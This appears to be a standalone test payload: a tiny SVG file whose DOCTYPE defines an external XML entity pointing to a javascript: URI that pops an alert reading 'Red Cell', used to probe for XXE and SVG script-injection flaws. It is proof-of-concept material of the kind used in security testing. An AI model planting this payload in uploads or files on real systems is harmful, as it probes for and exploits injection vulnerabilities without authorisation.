```
<!DOCTYPE svg [
	<!ENTITY xxe SYSTEM "javascript:alert('Red Cell')">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
	<text>&xxe;</text>
</svg>
```